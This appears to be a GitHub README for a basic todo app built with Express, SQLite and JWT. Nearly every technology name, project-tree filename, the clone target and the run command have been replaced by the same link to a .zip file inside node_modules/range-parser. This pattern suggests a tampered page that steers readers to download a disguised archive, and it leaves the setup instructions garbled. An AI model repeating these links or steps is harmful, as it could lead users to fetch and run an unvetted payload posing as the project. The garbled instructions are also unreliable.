📝 Todo App – https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip, Express, SQLite, JWT

A simple full-stack Todo application that provides user authentication and complete CRUD operations.
The backend is powered by https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip, https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip, SQLite, and JSON Web Tokens (JWT) for secure access.
The frontend is built entirely using native HTML, CSS, and JavaScript, offering a lightweight and responsive interface.

🚀 Features
🔐 Authentication

User registration (username + password)

User login with JWT token generation

Protected routes requiring valid JWT

Secure password hashing

✅ Todo Management (CRUD)

Create new todo

View all todos for the logged-in user

Update a todo’s content or status

Delete a todo

💾 Database

Local SQLite database

Separate tables for users and todos

Lightweight, fast, and file-based

🎨 Frontend

Pure HTML, CSS, and JavaScript

Simple and clean UI

Fetch API used to communicate with backend

Fully responsive layout

📦 Tech Stack
Backend

https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip

https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip

SQLite3

JSON Web Token (jsonwebtoken)

bcrypt (for hashing passwords)

Frontend

HTML

CSS

JavaScript (vanilla)

📁 Project Structure
/project
├── src/
│   ├── routes/
│   │   ├── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip      # Authentication endpoints (login, register)
│   │   └── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip      # Todo CRUD endpoints
│   ├── middleware/
│   │   └── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip  # JWT authentication middleware
│   ├── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip                  # SQLite database configuration
│   └── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip              # Express server entry point
├── public/
│   ├── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip             # Frontend application
│   ├── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip             # Custom styles
│   └── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip              # Additional styling
├── .env                       # Environment variables
├── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip               # Project dependencies
└── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip              # API testing file (REST Client)

⚙️ Installation & Setup
1️⃣ Clone the repository
git clone https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip
cd Simple-todo-app-with-authentication

2️⃣ Install backend dependencies
npm install

3️⃣ Run the backend server
node https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip


Backend will run on:

http://localhost:5000


🔑 Authentication Flow

User registers → password is hashed → stored in database

User logs in → receives JWT token

Frontend stores token in localStorage

Each protected request sends:

Authorization: Bearer <token>


Middleware validates the token before allowing access

📮 API Endpoints
Auth
Method	Endpoint	Description
POST	/auth/register	Create new user
POST	/auth/login	Login + get JWT token
Todos
Method	Endpoint	Description
GET	/todos	Get all todos for user
POST	/todos	Create new todo
PUT	/todos/:id	Update a todo
DELETE	/todos/:id	Delete a todo
🔒 Security

Passwords are never stored in plain text (bcrypt hashing)

JWT ensures only authenticated users access todo routes

Token is validated using middleware on every request



🧑‍💻 Author

Developed by Saif Gawdat
Feel free to connect or provide feedback!

📜 License

This project is free and open-source. Use it for learning or building your own applications.
